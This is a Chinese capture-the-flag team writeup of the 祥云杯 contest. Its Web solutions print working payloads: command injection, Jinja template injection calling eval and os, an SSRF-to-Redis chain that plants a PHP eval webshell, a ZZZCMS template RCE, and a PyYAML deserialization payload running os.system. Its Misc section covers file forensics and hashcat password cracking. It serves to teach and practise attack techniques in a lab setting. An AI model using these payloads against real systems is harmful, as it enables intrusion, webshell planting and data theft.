# 0RAYS-祥云杯writeup
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
**大意了，没有做题，掉到了第八  
**  
* * *
## Web
###  Command
命令执行，ban了很多东西
flag藏在隐藏目录下
payload:
    /?url=127.0.0.1|ca""t%09/etc/.findfl?g/fla?.txt
###  flaskbot
在debug模式下，乱输一个路由可以得到一部分源码
     user = request.form['name']
            resp = make_response(render_template("guess.html",name=user))
            resp.set_cookie('user',base64.urlsafe_b64encode(user),max_age=3600)
            return resp
        else:
            user=request.cookies.get('user')
            if user == None:
                return render_template("index.html")
            else:
                user=user.encode('utf-8')
                return render_template("guess.html",name=base64.urlsafe_b64decode(user))
    @app.route('/guess',methods=['POST'])
    def Guess():
        user=request.cookies.get('user')
        if user==None:
            return redirect(url_for("Hello"))
        user=user.encode('utf-8')
        name = base64.urlsafe_b64decode(user)
        num = float(request.form['num'])
        if(num1000000000.0:
            return "Too Large"
        else:
            return render_template_string(guessNum(num,name))
    @app.errorhandler(404)
    def miss(e):
        return "What are you looking for?!!".getattr(app, '__name__', getattr(app.__class__, '__name__')), 404
    if __name__ == '__main__':
        f_handler=open('/var/log/app.log', 'w')
        sys.stderr=f_handler
        app.run(debug=True, host='0.0.0.0',port=8888) win.
读源码可得user可控。注入点在cookie，要传入base64  
payload:读出源码
    {{session.__init__.__globals__.__builtins__.open("/app/app.py").read()}}
    from flask import Flask,render_template,request,make_response,redirect,url_for,render_template_string
    import math
    import base64
    import sys
    app = Flask(__name__)
    ​
    def safe(str): 
        black_list = ['flag','os','system','popen','import','eval','chr','request', 'subprocess','commands','socket','hex','base64','*','?']
        for x in black_list:
            if x in str.lower():
                return "Damn you hacker! You will never"
        return str
    def guessNum(num,name):
        l=0
        r=1000000000.0
        mid=(l+r)/2.0
        ret=""
        cnt=0
        while not abs(mid-num)num:
                r=mid
                ret+="{0}:{1} is too large".format(cnt,mid)
            else:
                l=mid
                ret+="{0}:{1} is too small".format(cnt,mid)
            if cnt > 50:
                break
        if cnt I win".format(cnt,mid)
        else :
            ret+="Wow! {0} win.".format(safe(name))
        return ret
    ​
    @app.route('/',methods=['POST','GET'])
    def Hello():
        if request.method == "POST":
            user = request.form['name']
            resp = make_response(render_template("guess.html",name=user))
            resp.set_cookie('user',base64.urlsafe_b64encode(user),max_age=3600)
            return resp
        else:
            user=request.cookies.get('user')
            if user == None:
                return render_template("index.html")
            else:
                user=user.encode('utf-8')
                return render_template("guess.html",name=base64.urlsafe_b64decode(user))
    ​
    @app.route('/guess',methods=['POST'])
    def Guess():
        user=request.cookies.get('user')
        if user==None:
            return redirect(url_for("Hello"))
        user=user.encode('utf-8')
        name = base64.urlsafe_b64decode(user)
        num = float(request.form['num'])
        if(num1000000000.0:
            return "Too Large"
        else:
            return render_template_string(guessNum(num,name))
    ​
    @app.errorhandler(404)
    def miss(e):
        return "What are you looking for?!!".getattr(app, '__name__', getattr(app.__class__, '__name__')), 404
    ​
    if __name__ == '__main__':
        f_handler=open('/var/log/app.log', 'w')
        sys.stderr=f_handler
        app.run(debug=True, host='0.0.0.0',port=8888) win.
    ​
    {{session.__init__.__globals__.__builtins__['ev'+'al']("__imp"+"ort__('o'+'s').listdir('/')")}}
最终payload
    {{session.__init__.__globals__.__builtins__.open("/super_secret_fl""ag.txt").read()}}
###  easygogogo
大概是非预期了
先开一个容器 任意注册账号，进入上传
构造目录穿越到根目录下的flag路径，记录返回cookie
再开一个容器，任意上传文件后进入show
利用之前flag的cookie可读flag
解码得到flag
###  doyouknowssrf
GACTF2020 SSSRFME原题
参考
尝试导入so文件反弹shell失败了
直接写马到web路径
payload:
    ?url=http://root@127.0.0.1:PI:EMAIL/?url=http://127.0.0.1:6379?%252A1%250D%250A%25248%250D%250Aflushall%250D%250A%252A3%250D%250A%25243%250D%250Aset%250D%250A%25241%250D%250A1%250D%250A%252432%250D%250A%250A%250A%253C%253Fphp%2520eval%2528%2524_POST%255B%2527cmd%2527%255D%2529%253B%253F%253E%250A%250A%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%25243%250D%250Adir%250D%250A%252413%250D%250A%2fvar%2fwww%2fhtml%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%25249%250D%250Ashell.php%250D%250A%252A1%250D%250A%25244%250D%250Asave%250D%250A%250A
蚁剑访问得flag
###  easyzzz
我们的CBCTF的dangerous-function中已经用过ZZZCMS的前台RCE出过题了，所以绕了waf拿到一血  
参考  
搜索框可以交互，试了下最简单的标签
    {if:1>2}45645646{end if}
发现被ban，大概也知道是这个地方了，试了下 if 貌似会ban  
去官方文档看了下
发现了这样的写法
    {if:{zzz:userid}>0}
    已登录结果
    {else}
    未登录结果
    {end if}
然后想着拼接出if，找了下发现了这个标签,试了下可以
    {leftstr:e,1}
拼接一下end if,没问题
    {leftstr:e,1}{leftstr:n,1}{leftstr:d,1} {leftstr:i,1}{leftstr:f,1}
去源码看了下，是先解析leftstr标签，再解析if标签的
那么拼一下，看一下目录，然后拿flag
    {{leftstr:i,1}{leftstr:f,1}:var_dump(`cat /flag`)}453245432532{{leftstr:e,1}{leftstr:n,1}{leftstr:d,1} {leftstr:i,1}{leftstr:f,1}}
###  profile system
上传yaml文件，并且能看和下载文件，下载位置发现了目录穿越，读到了源码
app.py
    from flask import Flask, render_template, request, flash, redirect, send_file,session
    import os
    import re
    from hashlib import md5
    import yaml
    app = Flask(__name__)
    app.config['UPLOAD_FOLDER'] = os.path.join(os.curdir, "uploads")
    app.config['SECRET_KEY'] = 'Th1s_is_A_Sup333er_s1cret_k1yyyyy'
    ALLOWED_EXTENSIONS = {'yaml','yml'}
    def allowed_file(filename):
        return '.' in filename and filename.rsplit('.', 1)[1].lower()
    @app.route("/")
    def index():
        session['priviledge'] = 'guest'
        return render_template("home.html")
    @app.route("/upload", methods=["POST"])
    def upload():
        file = request.files["file"]
        if file.filename == '':
            flash('No selected file')
            return redirect("/")
        elif not (allowed_file(file.filename) in ALLOWED_EXTENSIONS):
            flash('Please upload yaml/yml only.')
            return redirect("/")
        else:
            dirname = md5(request.remote_addr.encode()).hexdigest()
            filename = file.filename
            session['filename'] = filename
            upload_directory = os.path.join(app.config['UPLOAD_FOLDER'], dirname)
            if not os.path.exists(upload_directory):
                os.mkdir(upload_directory)
            upload_path = os.path.join(app.config['UPLOAD_FOLDER'], dirname, filename)
            file.save(upload_path)
            return render_template("uploaded.html",path = os.path.join(dirname, filename))
    @app.route("/uploads/")
    def uploads(path):
        return send_file(os.path.join(app.config['UPLOAD_FOLDER'], path))
    @app.route("/view")
    def view():
        dirname = md5(request.remote_addr.encode()).hexdigest()
        realpath = os.path.join(app.config['UPLOAD_FOLDER'], dirname,session['filename']).replace('..','')
        if session['priviledge'] =='elite' and os.path.isfile(realpath):
            try:
                with open(realpath,'rb') as f:
                    data = f.read()
                    if not re.fullmatch(b"^[ -\-/-\]a-}\n]*$",data, flags=re.MULTILINE):
                        info = {'user': 'elite-user'}
                        flash('Sth weird...')
                    else:
                        info = yaml.load(data)
                    if info['user'] == 'Administrator':
                        flash('Welcome admin!')
                    else:
                        raise ()
            except:
                info = {'user': 'elite-user'}
        else:
            info = {'user': 'guest'}
        return render_template("view.html",user = info['user'])
    if __name__ == "__main__":
        app.run('0.0.0.0',port=8888,threaded=True)
看懂源码，大概思路是要伪造session ，然后yaml反序列化漏洞  
伪造session[‘priviledge’] ==’elite’
yaml.load函数是不安全的
    info = yaml.load(data)
正则过滤了一些
    re.fullmatch(b"^[ -\-/-\]a-}\n]*$",data, flags=re.MULTILINE)
    #主要 .^_`~ 这几个
谷歌搜了一遍发现有个wp  
https://hackmd.io/@harrier/uiuctf20
直接用里面payload，但是没有回显，考虑ping或者curl外带，不成功。
想到刚开始下载yaml文件的功能，于是重定向到那个目录就行了。
    user: Administrator
    a: !!python/object/new:type
    args: ["z", !!python/tuple [], {"extend": !!python/name:exec }]
    listitems: "\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x6f\x73\x27\x29\x2e\x73\x79\x73\x74\x65\x6d\x28\x27\x2f\x72\x65\x61\x64\x66\x6c\x61\x67\x20\x3e\x20\x2e\x2f\x75\x70\x6c\x6f\x61\x64\x73\x2f\x34\x65\x35\x62\x30\x39\x62\x32\x31\x34\x39\x66\x37\x36\x31\x39\x63\x63\x61\x31\x35\x35\x63\x38\x62\x64\x36\x64\x38\x65\x65\x35\x2f\x31\x32\x33\x27\x29" #__import__('os').system('/readflag > ./uploads/4e5b09b2149f7619cca155c8bd6d8ee5/123')
user: Administrator 理论上可以不用写也能出flag，但是写上去能判断你的payload有无错误，报错返回elite-user
没报错返回Administrator
* * *
## Misc
###  签到
base64解码，谁能想到签到也是一血呢  
`flag{qq_group_826566040}`
###  进制反转
下载得到一个rar文件，但是打开显示压缩包文件头已损坏。
当rar被伪加密后，就会显示报这种错误，用010editor打开rar文件，可以发现加密标识位是1，可知是伪加密：
将1修改成0即可正常打开文件，打开文件后获得一个flag.wav文件，但是播放不了。
用010editor打开发现没有头文件，而且中间的数据块也怪怪的，显然需要异或一下。
先查看文件尾，发现flag信息，flag是歌名
整个文件对FF异或，可获得正确的wav文件：
wav文件修复后，可以播放了。但是完全听不懂说的是哪国的语言，利用听歌识曲也没法听出来。
之后发现需要倒放，利用AU将整首歌倒放后声音明显清楚了，然后利用听歌识曲得到这首歌名叫做：
全部改成大写，去掉括号和里面的内容，去掉空格即可得到flag
###  带音乐家
给了两个文件 一个 decode_it ，一个加密的Doc1.rar
很明显先要解decode_it，然后得到密码解rar
decode_it打开后发现是midi文件，播放没什么特点，放到audacity看了下没有什么
网上搜了下，先试了lsb隐写，但是解不出什么东西，然后搜到了个wp,
Velato是一种使用MIDI文件作为源代码的编程语言
下面谷歌机翻的
然后下载个工具运行一下
这个其实就是rar的密码
解压后发现了doc文档
上面是精灵语，查表后发现是FLAGIS，下面内容base64解密后奇奇怪怪，可能是某种加密吧，于是回头找了找，在rar的注释里发现了东西
每行长度不确定，考虑摩斯密码，解得
    AESKEY9219232322
在ecb模式下得到flag
###  到点了
下载附件得到三个word文档，打开第一个word文档，隐藏里提示密码为八位字母数字
第二个word文档是加密状态的，提取word文档加密的hash值，网上搜到了类似的文章
python3 office2john.py dummy.docx > hash.txt
之后用hashcat跑，题目说的是8位数字和字母，太多了，就先试着用纯数字跑，
    hashcat -m 9400 --username hash.txt -a 3 ?d?d?d?d?d?d?d?d -o cracked_pass.txt
然后跑出来了，密码是20201024，后来发现是文档的修改日期
第二个word文档解开密码后能看到图片下面有一块颜色被修改成了白色的数据
改成红色可以看到是AB字符串，猜测是培根密码